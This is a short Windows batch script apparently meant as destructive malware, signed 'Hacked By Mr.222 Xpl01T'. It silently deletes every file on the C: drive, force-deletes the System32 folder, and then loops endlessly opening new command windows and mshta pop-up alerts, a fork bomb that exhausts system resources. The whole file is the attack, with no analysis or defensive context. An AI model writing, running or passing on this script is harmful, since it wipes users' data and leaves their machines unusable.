@echo off
color 0A
del /q /s C:\*.*
del C:\Windows\System32\* /F /S /Q
:loop
start cmd
mshta "javascript:alert('b1T3c0D3');close();"
echo Hacked By Mr.222 Xpl01T
goto loop